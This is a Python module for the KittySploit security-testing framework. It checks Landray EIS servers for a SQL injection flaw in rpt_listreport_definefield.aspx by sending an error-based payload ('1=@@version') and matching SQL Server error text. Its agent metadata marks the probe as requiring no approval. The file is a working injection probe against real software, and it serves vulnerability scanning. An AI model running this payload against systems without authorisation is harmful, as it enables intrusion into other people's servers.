#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Landray's smart collaboration platform EIS has a very rich collection of modules to meet the needs of organiza."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Landray EIS - SQL Injection Detection',
        'description': "Landray's smart collaboration platform EIS has a very rich collection of modules to meet the needs of organizations and enterprises in knowledge, collaboration, and project management system construction. There is a SQL injection vulnerability in the rpt_listreport_definefield.aspx interface of Landray EIS smart collaboration platform",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'landray', 'eims', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8CEIS%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0rpt_listreport_definefield.aspx%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Microsoft SQL Server', 'SqlException',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Landray EIS - SQL Injection detected",
                path='/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+',
            )
            return True
        return False

